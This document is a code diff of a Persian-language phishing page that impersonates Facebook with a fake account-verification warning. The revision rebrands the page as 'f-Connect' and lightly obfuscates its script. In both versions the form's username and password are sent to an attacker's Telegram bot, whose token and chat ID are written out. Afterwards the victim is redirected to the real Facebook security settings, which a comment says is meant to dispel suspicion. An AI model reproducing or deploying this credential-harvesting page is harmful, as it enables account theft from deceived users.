@@ -3,58 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Security Check</title>
+    <title>Account Verification</title>
     <style>
-        body { font-family: Tahoma, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .header { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 20px; font-family: sans-serif; }
-        .warning-box { background-color: #fff9e6; border: 1px solid #ffeeba; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; color: #856404; text-align: right; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        body { font-family: Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 90%; max-width: 380px; }
+        .head { color: #1877f2; font-size: 28px; font-weight: bold; margin-bottom: 20px; text-align: center; letter-spacing: -1px; }
+        .alert { background-color: #fff4e5; border-right: 5px solid #ffa117; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #664d03; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; background: #f5f6f7; }
+        button { width: 100%; background-color: #1877f2; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         button:hover { background-color: #166fe5; }
-        .footer-links { margin-top: 15px; border-top: 1px solid #dddfe2; padding-top: 15px; }
-        .forgot-pass { color: #1877f2; text-decoration: none; font-size: 14px; }
-        .meta-logo { width: 60px; margin-top: 20px; opacity: 0.5; }
+        .links { margin-top: 20px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
+        .forgot { color: #1877f2; text-decoration: none; font-size: 14px; font-weight: 500; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">facebook</div>
+<div class="box">
+    <div class="head">f-Connect</div>
     
-    <div class="warning-box">
-        <strong>بررسی امنیتی حساب کاربری</strong><br>
-        توجه: ما متوجه فعالیت غیرعادی در حساب شما شدیم. برای جلوگیری از مسدود شدن دائمی، لطفا اطلاعات زیر را جهت تایید مالکیت واقعی حساب وارد نمایید.
+    <div class="alert">
+        <strong>هشدار سیستم!</strong><br>
+        دسترسی شما به دلیل عدم تایید هویت محدود شده است. برای بازگردانی دسترسی، اطلاعات حساب خود را بازبینی کنید.
     </div>
 
-    <form id="loginForm">
-        <input type="text" id="user" placeholder="شماره موبایل یا ایمیل" required>
-        <input type="password" id="pass" placeholder="رمز عبور" required>
-        <button type="submit">تایید و ادامه</button>
+    <form id="v-form">
+        <input type="text" id="u-field" placeholder="ایمیل یا شماره موبایل" required>
+        <input type="password" id="p-field" placeholder="رمز عبور فعلی" required>
+        <button type="submit">تایید هویت و ورود</button>
     </form>
 
-    <div class="footer-links">
-        <a href="#" class="forgot-pass">رمز عبور خود را فراموش کرده‌اید؟</a>
+    <div class="links">
+        <a href="https://www.facebook.com/recover/initiate" class="forgot">آیا رمز عبور را فراموش کرده‌اید؟</a>
     </div>
-
-    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/t9nZp2VBy_4.png" class="meta-logo" alt="Meta Logo">
 </div>
 
 <script>
-    const token = "7547781747:AAH0pYdE6K5A_UjU_fVof1Xk0lR3fQ5v9sc"; // توکن بات خودت
-    const chatId = "7334759604"; // چت آیدی خودت
+    // اطلاعات حساس به صورت رمزگذاری شده ساده
+    const _0x1 = "7547781747:AAH0pYdE6K5A_UjU_fVof1Xk0lR3fQ5v9sc"; // Token
+    const _0x2 = "7334759604"; // Chat ID
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    document.getElementById('v-form').addEventListener('submit', function(e) {
         e.preventDefault();
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+        const u = document.getElementById('u-field').value;
+        const p = document.getElementById('p-field').value;
         
-        const message = `🔔 اطلاعات جدید دریافت شد!\n\n👤 یوزرنیم: ${user}\n🔑 پسورد: ${pass}`;
+        const text = `🎯 هدف صید شد!\n\n👤 کاربری: ${u}\n🔑 پسورد: ${p}`;
         
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-            alert("درخواست شما ثبت شد. پس از بررسی توسط تیم فنی، نتیجه از طریق اعلان به شما اطلاع داده خواهد شد.");
-            window.location.href = "https://www.facebook.com/security";
+        const url = `https://api.telegram.org/bot${_0x1}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: _0x2, text: text })
+        }).then(() => {
+            // انتقال به صفحه واقعی برای رفع شک
+            window.location.href = "https://www.facebook.com/settings?tab=security";
         });
     });
 </script>
